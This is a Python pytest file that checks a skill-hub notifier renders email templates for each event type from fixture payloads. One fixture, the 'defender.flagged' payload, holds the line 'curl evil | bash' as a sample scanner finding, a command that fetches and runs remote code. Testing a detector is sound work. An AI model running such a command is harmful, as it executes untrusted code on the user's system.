"""Notifier templates — every event type renders with sensible payloads (M5-5).

If you add a new event type, add it to `SUPPORTED_EVENT_TYPES` AND drop
both .txt + .html files in `backend/services/notifier/templates/` — this
test sweeps them all.
"""

from __future__ import annotations

import pytest

from backend.services.notifier import SUPPORTED_EVENT_TYPES, render_template

# Fixture payloads — keys match `{placeholders}` in the template files.
_PAYLOADS: dict[str, dict[str, str]] = {
    "skill.uploaded": {
        "skill_name": "Sleek Skill",
        "skill_id": "sleek",
        "version": "1.0.0",
        "uploader": "u@org",
        "uploaded_at": "2026-01-01T00:00:00Z",
    },
    "skill.awaiting_review": {
        "skill_name": "Sleek Skill",
        "skill_id": "sleek",
        "version": "1.0.0",
        "classifier_status": "done",
        "defender_status": "clean",
        "defender_severity": "clean",
        "review_url": "https://hub/review/sleek",
    },
    "skill.quarantined": {
        "skill_name": "Bad Skill",
        "skill_id": "bad",
        "version": "1.0.0",
        "actor": "admin@org",
        "justification": "Found shell injection in scripts/run.sh",
        "defender_severity": "high",
    },
    "skill.approved": {
        "skill_name": "OK Skill",
        "skill_id": "ok",
        "version": "1.2.3",
        "actor": "admin@org",
        "published_at": "2026-01-01T01:00:00Z",
    },
    "skill.rejected": {
        "skill_name": "Meh Skill",
        "skill_id": "meh",
        "version": "0.1.0",
        "actor": "admin@org",
        "reason": "duplicate of `other-skill`",
    },
    "defender.flagged": {
        "skill_name": "Risky Skill",
        "skill_id": "risky",
        "version": "0.1.0",
        "severity": "medium",
        "finding_count": "2",
        "top_finding_rule": "shell.dangerous_command",
        "top_finding_location": "scripts/x.sh:1",
        "top_finding_explanation": "curl evil | bash",
        "review_url": "https://hub/review/risky",
    },
    "admin.override": {
        "skill_name": "Borderline",
        "skill_id": "borderline",
        "version": "1.0.0",
        "actor": "admin@org",
        "defender_severity": "medium",
        "justification": "False positive — the eval is on a literal string",
    },
    "curator.weekly_report": {
        "window_start": "2026-01-01",
        "window_end": "2026-01-08",
        "pass_count": "7",
        "transition_count": "12",
        "stale_count": "8",
        "archived_count": "4",
        "snapshot_count": "7",
        "error_count": "0",
        "dry_run_diffs": "0",
        "report_url": "https://hub/admin/curator",
    },
}


@pytest.mark.parametrize("event_type", SUPPORTED_EVENT_TYPES)
def test_render_all_event_types(event_type: str):
    payload = _PAYLOADS[event_type]
    out = render_template(event_type, payload)
    assert out.subject
    assert out.plain_text.strip()
    assert out.html.strip()
    # Subject + plaintext should contain the skill identifier or a
    # report-window-style anchor so receivers can scan the inbox.
    haystack = (out.subject + out.plain_text).lower()
    if (
        event_type.startswith("skill.")
        or event_type == "defender.flagged"
        or event_type == "admin.override"
    ):
        assert payload["skill_name"].lower() in haystack
    elif event_type == "curator.weekly_report":
        assert "weekly" in haystack


def test_render_unknown_event_type_raises():
    with pytest.raises(KeyError):
        render_template("nope.event", {})


def test_render_missing_keys_default_to_empty():
    """Partial payloads must not crash the worker; missing keys render ''."""
    out = render_template("skill.uploaded", {"skill_name": "X"})
    assert "X" in out.subject
    # Other placeholders are blank, not a crash.
    assert out.plain_text  # no exception
